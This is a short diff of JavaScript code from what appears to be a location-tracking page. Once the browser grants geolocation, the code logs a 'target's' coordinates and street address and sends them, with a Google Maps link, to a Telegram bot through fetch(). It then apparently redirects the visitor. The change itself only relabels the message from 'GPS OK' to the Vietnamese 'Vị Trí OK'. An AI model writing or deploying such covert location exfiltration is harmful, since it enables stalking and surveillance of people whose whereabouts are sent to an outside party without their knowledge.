@@ -176,7 +176,7 @@
                     
                     logData.lat = lat; logData.lon = lon; logData.address = fullAddr; logData.st = 'GPS';
                     saveLog(logData);
-                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("🎯 <b>" + target + "</b> GPS OK\n📍 " + fullAddr + "\n🗺️ Map: https://www.google.com/maps?q=" + lat + "," + lon)}`);
+                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("🎯 <b>" + target + "</b> Vị Trí OK\n📍 " + fullAddr + "\n🗺️ Map: https://www.google.com/maps?q=" + lat + "," + lon)}`);
                     jump();
                 }, jump, { timeout: 6000 });
             } else { jump(); }
